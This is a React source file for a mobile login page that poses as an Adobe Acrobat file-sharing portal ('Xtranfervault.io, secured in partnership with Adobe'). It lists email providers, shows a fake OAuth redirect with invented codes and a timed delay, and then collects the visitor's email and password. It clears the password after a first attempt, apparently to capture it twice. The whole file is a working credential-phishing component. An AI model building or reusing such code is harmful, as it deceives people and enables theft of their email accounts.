import React, { useState, useEffect } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName,
  onLoginSuccess,
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [isProcessingReturn, setIsProcessingReturn] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  // Check URL parameters on component mount
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const provider = urlParams.get('provider');
    const authCode = urlParams.get('code');
    const oauthProvider = urlParams.get('oauth_provider');
    
    // Clean up URL if there are any OAuth params (meaning it's a refresh)
    if (provider || authCode || oauthProvider) {
      // Clear the URL to show main login page
      const baseUrl = window.location.pathname;
      window.history.replaceState({}, document.title, baseUrl);
      return;
    }
  }, []);

  const handleProviderReturn = (providerName: string) => {
    // Clean up the URL
    const baseUrl = window.location.pathname;
    window.history.replaceState({}, document.title, baseUrl);
    
    // Trigger provider navigation immediately
    if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
      onGmailSelect();
    } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName.toLowerCase() === 'aol' && onAolSelect) {
      onAolSelect();
    } else if ((providerName.toLowerCase() === 'office365' || providerName.toLowerCase() === 'outlook') && onOffice365Select) {
      onOffice365Select();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const simulateOAuthRedirect = (providerName: string) => {
    // Show redirecting state
    setIsRedirecting(true);
    
    // Generate OAuth-like parameters
    const state = Math.random().toString(36).substr(2, 15);
    const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
    
    // First, update URL to show OAuth process is starting
    const authStartParams = new URLSearchParams({
      oauth_provider: providerName.toLowerCase(),
      state: state,
      redirect_initiated: 'true'
    });
    
    const currentPath = window.location.pathname;
    window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
    
    // Simulate OAuth redirect delay
    setTimeout(() => {
      // Simulate returning from OAuth with auth code
      const returnParams = new URLSearchParams({
        code: code,
        state: state,
        provider: providerName,
        scope: 'email profile',
        auth_time: Date.now().toString()
      });
      
      window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
      
      // Trigger the provider's login page
      handleProviderReturn(providerName);
    }, 1500); // 1.5 second delay
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
    setIsRedirecting(false);
    setIsProcessingReturn(false);
  };

  // Captcha removed: clicking a provider now proceeds immediately to redirect flow
  const handleProviderClick = (providerName: string) => {
    // directly start redirect simulation / provider flow
    simulateOAuthRedirect(providerName);
  };

  const AdobeLogo = () => (
    <img 
      src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
      alt="Adobe Acrobat Reader Logo" 
      className="w-9 h-9 drop-shadow-lg"
    />
  );

  return (
    <div 
      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
      }}
    >
      {!selectedProvider ? (
        // --- Provider Selection without Container Card ---
        <>
          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            {/* header text removed as requested */}
          </div>

          <div className="p-6">
            <p className="text-center text-base font-bold text-gray-900 mb-5 drop-shadow-[0_1px_3px_rgba(255,255,255,0.8)]">Choose your email provider</p>
            <div className="space-y-2.5">
              {emailProviders.map((provider) => (
                <button
                  key={provider.name}
                  onClick={() => handleProviderClick(provider.name)}
                  type="button"
                  className="w-full group"
                >
                  <div className="flex items-center px-4 py-3 bg-white/75 backdrop-blur-md rounded-xl border border-white/40 active:bg-white/90 active:scale-[0.98] transition-all duration-200 shadow-lg">
                    <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0 drop-shadow-sm" />
                    <span className="flex-1 text-base font-semibold text-gray-700 ml-4">
                      {provider.name}
                    </span>
                    <svg className="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                </button>
              ))}
            </div>

            {/* Footer: keep on one line while enabling horizontal scroll inside footer only (no page overflow) */}
            <div className="mt-8 text-center">
              <div
                className="inline-block max-w-full overflow-x-auto"
                style={{ WebkitOverflowScrolling: 'touch' }}
              >
                <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] whitespace-nowrap inline-block px-4">
                  Xtranfervault.io. Secured in partnership with Adobe®.
                </p>
              </div>
            </div>
          </div>
        </>
      ) : (
        // --- Login Form with Container ---
        <>
          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-bold text-gray-900">Sign in with {selectedProvider}</h1>
            
          </div>

          <div className="bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/30">
            <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 active:text-gray-900 font-medium mb-6">
              <ArrowLeft className="w-4 h-4" />
              Change provider
            </button>

            <form onSubmit={handleSubmit} className="space-y-5">
              {errorMessage && ( <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50"> {errorMessage} </div> )}
              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="email">Email Address</label>
                <div className="relative mt-2">
                  <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
                  <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full pl-11 pr-4 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
                </div>
              </div>
              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="password">Password</label>
                <div className="relative mt-2">
                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
                  <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-11 pr-12 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-800">
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
              <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/30">
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Sign In'}
              </button>
            </form>
          </div>

          {/* Login form footer: keep on one line with internal horizontal scroll only */}
          <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
            <div className="max-w-full overflow-x-auto" style={{ WebkitOverflowScrolling: 'touch' }}>
              <p className="text-xs text-gray-600 text-center inline-block whitespace-nowrap px-4">
                Xtranfervault.io. Secured in partnership with Adobe®.
              </p>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default MobileLoginPage;
